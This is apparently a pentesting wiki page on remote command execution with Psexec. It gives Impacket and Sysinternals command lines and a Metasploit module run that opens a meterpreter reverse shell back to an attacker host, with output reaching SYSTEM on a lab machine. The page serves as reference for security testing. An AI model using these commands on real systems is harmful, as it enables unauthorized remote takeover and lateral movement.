---
description: Execute a command-line process on a remote machine.
---

# Psexec

## Impacket psexec

```text
iron@kali2:~$ psexec.py Administrator:Password@192.168.0.52 
Impacket v0.9.21.dev1+20200217.163437.e5e676d7 - Copyright 2020 SecureAuth Corporation 
[*] Requesting shares on 192.168.0.52..... 
[*] Found writable share ADMIN$ 
[*] Uploading file nuoeaJhE.exe 
[*] Opening SVCManager on 192.168.0.52..... 
[*] Creating service hzgf on 192.168.0.52..... 
[*] Starting service hzgf..... 
[!] Press help for extra shell commands 
Microsoft Windows [Version 6.2.9200] 
(c) 2012 Microsoft Corporation. All rights reserved. 
C:\Windows\system32>whoami 
nt authority\system 
```

## Metasploit

```text
msf5 exploit(windows/smb/psexec) > show options  
Module options (exploit/windows/smb/psexec): 
   Name                  Current Setting   Required  Description 
   ----                  ---------------   --------  ----------- 
   RHOSTS                192.168.0.52      yes       The target host(s), range CIDR identifier, or hosts file with syntax '
file:<path>
' 
   RPORT                 445               yes       The SMB service port (TCP) 
   SERVICE_DESCRIPTION                     no        Service description to to be used on target for pretty listing 
   SERVICE_DISPLAY_NAME                    no        The service display name 
   SERVICE_NAME                            no        The service name 
   SHARE                 ADMIN$            yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share 
   SMBDomain             .                 no        The Windows domain to use for authentication 
   SMBPass               ServicePass_b123  no        The password for the specified username 
   SMBUser               Administrator     no        The username to authenticate as 
Payload options (windows/meterpreter/reverse_tcp): 
   Name      Current Setting  Required  Description 
   ----      ---------------  --------  ----------- 
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none) 
   LHOST     192.168.0.51     yes       The listen address (an interface may be specified) 
   LPORT     4444             yes       The listen port 
Exploit target: 
   Id  Name 
   --  ---- 
   0   Automatic 
msf5 exploit(windows/smb/psexec) > run 
[*] Started reverse TCP handler on 192.168.0.51:4444  
[*] 192.168.0.52:445 - Connecting to the server... 
[*] 192.168.0.52:445 - Authenticating to 192.168.0.52:445 as user 'Administrator'... 
[*] 192.168.0.52:445 - Selecting PowerShell target 
[*] 192.168.0.52:445 - Executing the payload... 
[+] 192.168.0.52:445 - Service start timed out, OK if running a command or non-service executable... 
[*] Sending stage (180291 bytes) to 192.168.0.52 
[*] Meterpreter session 1 opened (192.168.0.51:4444 -> 192.168.0.52:49162) at 2020-03-16 09:38:33 +0000 
meterpreter >  
```

## Sysinternals

[https://docs.microsoft.com/en-us/sysinternals/downloads/psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)

```text
PsExec.exe /accepteula \\192.168.1.2 -u CORP\user -p password cmd.exe
```

